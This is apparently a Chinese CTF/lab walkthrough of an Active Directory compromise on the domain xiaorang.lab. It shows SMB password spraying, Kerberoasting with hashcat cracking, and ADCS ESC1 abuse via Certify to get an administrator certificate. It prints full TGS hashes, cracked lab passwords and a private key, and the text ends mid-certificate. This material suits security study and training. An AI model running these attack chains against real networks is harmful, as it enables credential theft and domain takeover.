<h2 id="机器26和域控"><a href="#机器26和域控" class="headerlink" title="机器26和域控"></a>机器26和域控</h2><p>得到flag02和一个数据库文件，把这个.db文件用Navicat打开直观的查看数据，当然直接用命令行也是可以的<br><code>sqlite3 /home/kali/Desktop/personnel.db</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755090291234.png"><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755090157494.png"><br>这里发现xr_salary和xr_members里面有很多用户名，从xr_members里面的email猜测可能为用户名，xr_salary里面更全一点，导出为output.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; .mode list</span><br><span class="line">sqlite&gt; .separator &quot;&quot; </span><br><span class="line">sqlite&gt; .once output.txt</span><br><span class="line">sqlite&gt; SELECT name FROM xr_salary;</span><br></pre></td></tr></table></figure>
<p>当然也可以用Navicat导出，就是要处理一下导出文件内容的双引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"> </span><br><span class="line"># 检查是否提供了文件名参数</span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    print(&quot;Usage: python eraser.py &lt;filename&gt;&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"> </span><br><span class="line"># 获取命令行参数中的文件名</span><br><span class="line">filename = sys.argv[1]</span><br><span class="line"> </span><br><span class="line"># 读取文件内容</span><br><span class="line">with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    content = file.read()</span><br><span class="line"> </span><br><span class="line"># 删除所有双引号</span><br><span class="line">content = content.replace(&#x27;&quot;&#x27;, &#x27;&#x27;)</span><br><span class="line"> </span><br><span class="line"># 将处理后的内容写回原文件</span><br><span class="line">with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    file.write(content)</span><br><span class="line"> </span><br><span class="line">print(f&quot;所有双引号已删除，并将结果保存回 &#123;filename&#125;&quot;)</span><br></pre></td></tr></table></figure>
<p>这里先尝试一下有没有不需要Kerberos预身份验证的用户<br><code>proxychains impacket-GetNPUsers -dc-ip 172.22.9.7 -usersfile output.txt xiaorang.lab/</code><br>没有找到不需要Kerberos预身份验证的用户<br>想起来xr_users有几个密码，导出为password.txt<br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755090166343.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; .once password.txt</span><br><span class="line">sqlite&gt; SELECT password FROM xr_users;</span><br></pre></td></tr></table></figure>
<p>尝试crackmapexec爆破<br><code>proxychains -q crackmapexec smb 172.22.9.0/24 -u output.txt -p password.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SMB         172.22.9.26     445    DESKTOP-CBKTVMO  [+] xiaorang.lab\zhangjian:i9XDE02pLVf </span><br><span class="line">SMB         172.22.9.7      445    XIAORANG-DC      [+] xiaorang.lab\zhangjian:i9XDE02pLVf </span><br></pre></td></tr></table></figure>
<p>得到这两个成功数据，尝试直接远程登录<br><code>proxychains rdesktop 172.22.9.26 -u zhangjian -d xiaorang.lab -p &#39;i9XDE02pLVf&#39;</code><br>报错，换xfreerdp<br><code>proxychains xfreerdp /u:&quot;zhangjian@xiaorang.lab&quot; /v:172.22.9.26:3389</code><br><code>i9XDE02pLVf</code><br>依然登不上<br>根据flag02的提示，这里应该要查询SPN，这里需要先简单提及几个概念</p>
<blockquote>
<p>Kerberos<br>域环境中非常常见的身份认证协议，认证过程主要有以下三个方面<br>身份验证服务 (AS) 交换 (KRB_AS_*）<br>票证授予服务 (TGS) 交换 (KRB_TGS_*）<br>客户端&#x2F;服务器 (AP) 交换 (KRB_AP_*）<br>在这里我们主要关注的是TGS交换过程，这里的AS和TGS是KDC的两个组成部分</p>
</blockquote>
<blockquote>
<p>SPN<br>服务主体名称（SPN：ServicePrincipal Names）是服务实例的唯一标识符。可以理解为域内服务的身份证，每个服务都有一个唯一的SPN，而服务在注册SPN的时候会和账号进行绑定，因此SPN起到了将服务实例与服务登录帐户相关联的作用。一个SPN对应一个账户和一个服务，但一个账户可以对应多个SPN和服务<br>这里比较重要的是，任何一个域内账户都可以向DC查询所有域内用户对应的SPN并进行TGS交换过程，在KRB_TGS_REP过程将会返回查询到的用户的TGS tickets，然后我们即可使用爆破工具对于返回的票据进行爆破，获取对应明文。</p>
</blockquote>
<p>获取域用户下的 spn<br><code>proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</code><br>得到了 krb5tgs 的 Kerberos TGS-REP（Ticket-Granting Service Reply）票据的哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$4d2a3b5414ac0b8694919d1442e2c45c$211857a3313b3944e6fa6ef1f15759930748fdb10168f920d1de8263c15b05df85008ccae76badc4eb27c688aa5adf504ea7be8fe4385830df096676dbcadb0de31d5d381f9dbafdde725d8ed8ba53612f09233e0de547b4455f0dd910b4618c2f23849e0d9b225b09c0492d28d6ddac5595648094f5c84f0ab1842f46ddfe534491d4e72a859640f000cd0660aad88e8ecec62817b33ea7853e7985bc9d4d6b9756c82c1b524c5bcc82dcf751b08c351582b3e32928261fb7a8aa89eaec4c8e0e042da4861d4f9cb29db82c41fa44f38ed6c44a399bcb236d454eae90655dd93dccff018418341280417f8ea849bd1d717f0e6aacf22b43bd88b6fd8940298c814d331f14680567503c44fe93730eb5eb4cd517aeb5a2241333e60007ae39788ac4d97a6ce8ee2d009562c772feb1025abb3d820716e0d45c359b562ca3dfe5124319de35b19b8cab3f463b9a5989a62495ac845276ba8bcd0a3feadfba9bbb97322cd21fcb142cab43e0c49a9963bfdb8e2284d1d4b8af34864b10899d565ec5b7a593f6263fd1230d48266149f7c502f5c795f8568b9618cb8624637538dc4eacc06797d8c3fd668c3a8528eceec4ca7c40ad57353cc294114ca2005b38b42a211e6af2bf4acace33d7fd9f30e69ad93f574f11405cc304248aa751393372025a38eabbc74fcf3d1af41178385172d5357ed9171a6d2fe4c9edc679c01edc64a5351c973ff8e7acfbb9817e6f4e0fd36ef2d1375b4f7de6d6b3b9ef0fa72ecfd64ec1a4994525e8fedb93b97596f35c1c161d669526cf6a797a776014921cd1795782653fb02cbbfbae2bca6721f6f635978e7fe43c9ce0256fa38bafa467838d40e897369deba8fdba4984d8f8581cf0cb7bf5489f061e3d875e4951729b26be2766621a48eba9054cb6f45628d66d66670a515cde5f3425998a1eb7f44061dc55433893840f44a13e99abf811fe6de12c5f67b588ffe0a420156e20c2e013ff9c9fcfeaa8396e483f6abb991c106ccd0d5d2aecf7c1260ff11bf0acae984fd3be10954131d9504474d24f3f893ab9e6e87fdc6d859d1550e4d47200648df29c9e89f5ebffce6b2e15f20e3155a239ed427df341192ccdd695e79166f7b5d72c668113357b0f22962f4ddcc06233b886dfa0f4192f92ab44a528172d4dedef2a7d6f0eb92ce7f7fcb38374a51de11f4a457523729aaa97d4d532c4ec9ac4b5ca8d0a1cc331b7a3dc399a7c860c2c3ba2e4b84cadda6d780a45bcceb20be9d78b97fb8e4045e5dfff3cb7239ad9b6213ed3916eab87246e476c9a225b5158849cf421ee964084bc57f01b574b57a49ccac4ecd191204e9ad0a22d03d085e50991966296b78db29979309382747bbbe619b954e3cd6fa4a55cc1f185f442bed3694361b9f1ac3d2222d15bec199a06145ca78b9432f52ff0e0339e65d58c70742d2309daead950a74e1b0b99901de36590216f5939b7cee0b8accba6d2d1f54793d4b042b00bdcaf0b235de3d0</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$ec4c2166317530813dd7d06e6429e6e5$ec83f4af6c5209cb1bf09824445cebf2deb893570646861448ac00edbf850d1a2b13bcdf7a1d3fb3f932d2f0facc54d703c1eab9626054bea8915e44798b8343f956e1883eb3de55658f353660a941d3b96a9913e71b094bccb7e498bab4f815d1ac6cf00cd578f0f713fd9d6a4a08da78c9c25a4357cd87967602b0cac67272c34df78ceb4f4c9c5bbc1ddacc075bcbf4757a390875bda3fd69d5d285180635ed20ef7e1f7fb51e3e62060599e5a70a89ad2ab079fe6087154394d6cc0caf0256c0872ad5cf9737bde7608cea7a2743cdd672ab7efb991418bdff284aca2d7857e73b54dc49b0fe164f745f62c126fa6e2a0ed7acb1563cc94e09d5e8de64ad2a4132cb5209059deadf0d8aa1279590551a0010f49e2d67726238b04fd4e8c8fe96704b460a32b58cb33d1199dc14e59a4119db502d32a2f10cccf9b1c83970c1c870410e8f77eacef775178c69bcfcb1175dd4dc39051bccb80b8fce2dad75335c7cab203eea9557c0a48adf687ef33aeaae84bc72b782a4bcb477ed0d48a7c6083ea60b75333cc66cd051269f3b646bca56e77b8dbb7afbf908e222cc3afd3ae4b40b9589d95190e40652933a03c3d1d2450ca6c52ddde671b248711145d675b8412ec323d702ec8e5d69d3431bd51fa29ce9e70bbf6010b6e89e074f798ad507576f0de5fe1c328cb5977f46ad9faa6027e7c206c8912dcbd09ca20f864a51547c0d29293b4079817d375de76a15a74844252b296428f013a316f2ed44d0f6434a987c3a1189b27aa00131bca484fcd39c4ba3c6755e283dfbe1e5027d788df5fc39b61fd77de925b29d0464ad8b9e5b44fbb560686f12e3ee30bddfee6573b466e578fedc96180399800ecf40731a357ad8fd43641a9d0a29b1329165afae57a87e81f0e10134a80706d9cf94ebd3111dd11d507c176f82c6ec783b39a30191e0656047f694acafeba6f7d58952bb5ea5652704f6829ec520b0d4ecebd2a58eb18fe709d42175484d76089ce0ccaee9425623ee0d960272b7593e91a75761f392447600f715c7feb2e9bb9e78389e5c913a5d4685261abc7368b4f804c994334ac9bfea834bb0297c385806ad5e5335abd85c0e092ef5bf1be90b24de3c5f554da92e04d1aac0f4a26b9cecde97b53e1075a6d309378ebed9924bfc1853efed2f9c28c2daf1bc62a91a72321f6bd94909398cb9acdc60aaa02118a0923e9401da1be198796a326e0483baee94d975f74fd0d4ec633ed46c8b52f9233002b9286c018c557fce4c1db4977df667df0294ed956dbf10fe39c690a80937c02b5443c5b4953f1252ec8b6aeb0aa20f9ecc339e0a39cdfc85df65b2287b8ec2261cd855dc6475c6efd3c5cc999ddd05ed2c3127f2136572f466dfe2cc32aead96ae54e6a2d7265628881fabf11513db2afcf6471a428860d1812fc220448a4cfee63a0f404d933aa656604a1899d1954d39daf7973ee15dc523dfac95eab521b600554a4f943b997540a5f050ab54</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-m 13100: Kerberos 5, etype 23, TGS-REP (Service Ticket)<br>含义: 这种模式用于破解从 Kerberos 服务票据 (Service Ticket 或 Ticket Granting Service Reply, TGS-REP) 中提取的哈希值。<br>来源: 通常在网络抓包（例如使用 Wireshark 或 tcpdump）中捕获的 Kerberos TGS-REP 响应包。攻击者向 KDC 请求访问特定服务（如 HTTP&#x2F;server.domain.com）时，KDC 返回的包含服务票据的响应包。<br>包含内容: 该哈希代表的是用于加密服务票据部分的密钥。这个密钥是从服务账户的密码派生的（对于计算机账户，通常是计算机账户的密码；对于服务账户，则是该服务账户的密码）。<br>攻击目标: 成功破解此哈希意味着获取了服务账户的密码（或计算机账户的密码）。这可以用来模拟该服务或横向移动到该服务运行的机器。<br>典型 Hashcat 哈希格式:<br>$krb5tgs$23$<em>ServiceAccountName$REALM$SPN</em>$HexEncodedPart1$HexEncodedPart2<br>$krb5tgs$：标识是 TGS-REP 哈希。<br>23：表示加密类型为 rc4-hmac (etype 23)。<br>ServiceAccountName：请求的服务票据所对应的服务账户名（或计算机账户名）。<br>REALM：Kerberos 域名。<br>SPN：所请求的服务主体名称（Service Principal Name），例如 HTTP&#x2F;server.domain.com。<br>HexEncodedPart1 &#x2F; HexEncodedPart2：从 TGS-REP 响应中提取的十六进制数据块。</p>
</blockquote>
<p><code>hashcat -a 0 -m 13100 --force hash.txt /usr/share/wordlists/rockyou.txt</code><br>得到两个密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\zhangxia MyPass2@@6</span><br><span class="line">xiaorang.lab\chenchen @Passw0rd@</span><br></pre></td></tr></table></figure>
<p>直接进行rbp登录<br><code>proxychains xfreerdp /u:&quot;zhangxia@xiaorang.lab&quot; /v:172.22.9.26:3389</code><br><code>MyPass2@@6</code></p>
<blockquote>
<p>xfreerdp传文件相关参数<br>共享剪贴板：<br><code>xfreerdp /u:用户名 /v:远程IP地址 +clipboard</code><br>挂载本地目录： 将本地目录映射到远程 Windows：<br><code>xfreerdp /u:用户名 /p:密码 /v:远程IP地址 /drive:data,/home/user/data</code></p>
</blockquote>
<p>当然也可以在windows起个代理用windows远程桌面<br><code>./linux_x64_agent -l 44445 -s 123</code><br><code>./windows_x64_admin.exe -c 39.98.107.120:44445 -s 123</code><br>这里登录上去后需要提权，利用Certify.exe查看证书是否存在问题<br><code>Certify.exe find /vulnerable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\zhangxia\Desktop&gt;Certify.exe find /vulnerable</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ &#x27;__| __| |  _| | | |</span><br><span class="line"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |</span><br><span class="line">                             __/ |</span><br><span class="line">                            |___./</span><br><span class="line">  v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Action: Find certificate templates</span><br><span class="line">[*] Using the search base &#x27;CN=Configuration,DC=xiaorang,DC=lab&#x27;</span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Hostname                  : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    FullName                      : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E</span><br><span class="line">    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Cert Start Date               : 2023/7/14 12:33:21</span><br><span class="line">    Cert End Date                 : 2028/7/14 12:43:21</span><br><span class="line">    Cert Chain                    : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br><span class="line"></span><br><span class="line">[!] Vulnerable Certificates Templates :</span><br><span class="line"></span><br><span class="line">    CA Name                               : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Template Name                         : XR Manager</span><br><span class="line">    Schema Version                        : 2</span><br><span class="line">    Validity Period                       : 1 year</span><br><span class="line">    Renewal Period                        : 6 weeks</span><br><span class="line">    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line">    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS</span><br><span class="line">    Authorized Signatures Required        : 0</span><br><span class="line">    pkiextendedkeyusage                   : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class="line">    mspki-certificate-application-policy  : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights           : NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Domain Users         S-1-5-21-990187620-235975882-534697781-513</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                       : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">        WriteOwner Principals       : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">        WriteDacl Principals        : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">        WriteProperty Principals    : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ESC1利用前提条件：<br>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT<br>表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户<br>PkiExtendedKeyUsage: Client Authentication<br>表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证<br>Enrollment Rights: NT Authority\Authenticated Users<br>表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书</p>
</blockquote>
<p>这里完美满足ESC1利用条件，所以可以尝试利用ESC1<br>查看CA机器<br><code>certutil -config - -ping</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\zhangxia\Desktop&gt;certutil -config - -ping</span><br><span class="line">XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">正在连接到 XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA ...</span><br><span class="line">服务器 &quot;xiaorang-XIAORANG-DC-CA&quot; ICertRequest2 接口还在运行 (16ms)</span><br><span class="line">CertUtil: -ping 命令成功完成。</span><br></pre></td></tr></table></figure>
<p>获取证书<br><code>Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:ESC1 /altname:administrator</code><br>这里前面的证书写了Template Name: XR Manager，所以报错，改成XR Manager即可<br><code>Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:&quot;XR Manager&quot; /altname:administrator</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\zhangxia\Desktop&gt;Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:&quot;XR Manager&quot; /altname:administrator</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ &#x27;__| __| |  _| | | |</span><br><span class="line"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |</span><br><span class="line">                             __/ |</span><br><span class="line">                            |___./</span><br><span class="line">  v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Action: Request a Certificates</span><br><span class="line"></span><br><span class="line">[*] Current user context    : XIAORANG\zhangxia</span><br><span class="line">[*] No subject name specified, using current context as subject.</span><br><span class="line"></span><br><span class="line">[*] Template                : XR Manager</span><br><span class="line">[*] Subject                 : CN=zhangxia, CN=Users, DC=xiaorang, DC=lab</span><br><span class="line">[*] AltName                 : administrator</span><br><span class="line"></span><br><span class="line">[*] Certificate Authority   : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line"></span><br><span class="line">[*] CA Response             : The certificate had been issued.</span><br><span class="line">[*] Request ID              : 6</span><br><span class="line"></span><br><span class="line">[*] cert.pem         :</span><br><span class="line"></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAo0pwrgjW1pJhLm2T/NAnx2WQLjuN0bxtvrM1/OTP9FNa0+Je</span><br><span class="line">FEan+AjEC3BVAVGsq8mpzyk4tQKQ56fzMzQ/3AyF4CrlxgTqjw20TIOujhK5H+c1</span><br><span class="line">YH7K6GMl/GTcESO+fMfbh1kyW0IHGN2lzTVFx7C7/zg/HIvv1aBMWR8UIT4o1rE2</span><br><span class="line">xsuDVVotR+gKRQH+dcQZLh3Dqawer+8VGoYRG1H1gXMulN0Or0DHg2Rq36HLju94</span><br><span class="line">TCMJqgPaK8PmtcNZ3jH7oJftk3ipfNeVxILGG3R/oLaPfB28SFAntnX+QKsr2w7N</span><br><span class="line">GJZMAIyMZlmKaZvk59qfxUDeTzx0EaWn/SVpqwIDAQABAoIBAEVxDktMsgSNOqvS</span><br><span class="line">aNleMlR/Uhn/NJgJsIglUWPLcM5gNmOeRFEOHTeDjs+ohVXqxGpH+CGDz7xWq4YA</span><br><span class="line">rBHN+gxb/QDwbUfRZmjQtKjHZU/BEZ5KJq5zLVo3c/uKbvYRA9yv56F/IsWhZkBC</span><br><span class="line">XlTO/25lMAXhByHeNu/b3CwYZeiehms1dKsmNVTSScxcbKT8F9iuefC+NHWZJUjV</span><br><span class="line">h0lbH53XKswLMSE/APer9xhhGclG1WW6817X1xFt6b130RGzp1Z/hL9qvZ859Zvy</span><br><span class="line">3DbcipfYsVKTalViEL235MbKknoNqjym/IYhoRQmtTug1O7Nq+E2BZWfzvjrAz4J</span><br><span class="line">87Lx0o0CgYEA4UTS3I8VoAOQT95KTX7UilXvH/ke6eiJIxFVmZl/S3SLZbA0rNez</span><br><span class="line">3/PxuH1OP/j1ST/7+imgoJic7/VPMGoF+Dpx3ki3ipKhc7bV46vLp17qHnCcZdus</span><br><span class="line">ypPimck6jaRki5XoIB9TVz3xFdSzmXstUqM7BdPUS3HfLZYMXg4SNw8CgYEAuZEg</span><br><span class="line">LiZlszvk6PdintlgmDOrVvzAmYXufDNgTqOn8DPwGxaPuf/rLyOJFalfYLgW3U1o</span><br><span class="line">zpPKTzol+kK2lZwSnJ81qWgQ1stB2nVQTpJEZBiUYYQfdp/rJjzcdCHvONmFvY3+</span><br><span class="line">TMZIENisI+So/XfWy7R/R66yvVcZCTT5u5ERQ6UCgYAiSk+uszkfemtlPPkigsPn</span><br><span class="line">qt0TiOBjyrnVVLYrA2qVGdB+Uiwyg0MmPAP3iVt38XWlCNBabCu/RnvdKwI65Gi0</span><br><span class="line">OHFM3NTTiy54ZsR4O5Zsi84nhAzKlH3g+FHuBuua1ANaHB+RhDMzfIJOSGpuWomz</span><br><span class="line">opVBddVDBrpqPgTz7EBpkQKBgQCp5+1VFCcuMvrnLAuKcnJ1KWoKXaZjazPvWIMn</span><br><span class="line">vcT4tDV2N/QlU+Oc56aOxOPlhOi6fDQoYT1tyUoYmJjg52RLL6NMl1JDuRt00NFU</span><br><span class="line">/6vLEo5Zs0Wzsbz25+baFnAY12ITKz3aQfqeIiWLP8RTQDTVk1Cu65AQuPzdZzn5</span><br><span class="line">uVvbWQKBgDX9hZKRxDcu5ovaWjGzv5Y0yp2pSjbfQ1XewJPYf9Uju2dEz1slZ8/0</span><br><span class="line">OzWNTQeYwX0GTYyV6ZeQRc3eIoeh5dR0sr3hgVGAI62AX1rECH4HEqneys50gh2Z</span><br><span class="line">z5hWUJx64REPv0y2EP79mLNlaDyl3ZKlE9WUH/ppMODtvhxmj5Ke</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIGQTCCBSmgAwIBAgITfgAAAAZXELXU53jXvQAAAAAABjANBgkqhkiG9w0BAQsF</span><br><span 